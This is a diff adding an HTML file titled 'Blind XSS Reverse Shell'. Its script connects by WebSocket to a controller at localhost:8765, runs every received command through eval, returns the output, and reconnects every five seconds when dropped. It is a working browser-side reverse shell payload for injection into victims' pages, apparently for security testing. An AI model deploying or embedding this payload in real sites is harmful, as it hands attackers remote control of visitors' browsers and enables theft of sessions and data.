@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Blind XSS Reverse Shell</title>
+  </head>
+  <body>
+    <script>
+      const connectWebSocket = () => {
+        const socket = new WebSocket("ws://localhost:8765");
+        socket.addEventListener("open", (event) => {
+          console.log("WebSocket connection established");
+        });
+
+        socket.addEventListener("message", (event) => {
+          const command = event.data;
+          console.log('Received command: ', command);
+          try {
+            const result = eval(command);
+            socket.send(JSON.stringify({ result }));
+            console.log(result)
+          } catch (error) {
+            socket.send(JSON.stringify({ error: error.toString() }));
+          }
+        });
+
+        socket.addEventListener("close", (event) => {
+          console.log('WebSocket connection lost. Retrying in 5 seconds...');
+          setTimeout(connectWebSocket, 5000);
+        });
+      }
+
+      connectWebSocket();
+    </script>
+  </body>
+</html>
